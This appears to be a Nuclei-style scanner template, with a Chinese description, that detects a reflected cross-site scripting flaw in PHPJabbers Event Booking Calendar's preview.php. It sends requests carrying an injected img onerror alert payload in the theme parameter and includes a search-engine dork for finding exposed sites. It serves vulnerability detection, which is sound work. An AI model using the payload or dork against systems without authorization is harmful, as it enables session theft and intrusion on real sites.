id: phpjabbers-event-booking-xss

info:
  name: PHPJabbers Event Booking Calendar - 反射型跨站脚本
  author: 0x_Akoko
  severity: medium
  description: |
    该模板用于检测 PHPJabbers Event Booking Calendar - 反射型跨站脚本。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3D...`、`/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.do...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://cxsecurity.com/issue/WLB-2026050008
    - https://www.phpjabbers.com/event-booking-calendar/
  metadata:
    verified: true
    max-request: 2
    vendor: phpjabbers
    product: event-booking-calendar
    google-query: inurl:"event-booking-calendar" inurl:"preview.php"
  tags: phpjabbers,xss,reflected

http:
  - method: GET
    path:
      - "{{BaseURL}}/scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest"
      - "{{BaseURL}}/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest"

    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "<img src=x onerror=alert(document.domain)>test")'
          - 'contains_any(body, "Event Booking Calendar", "PHPJabbers")'
          - 'contains(content_type, "text/html")'
        condition: and
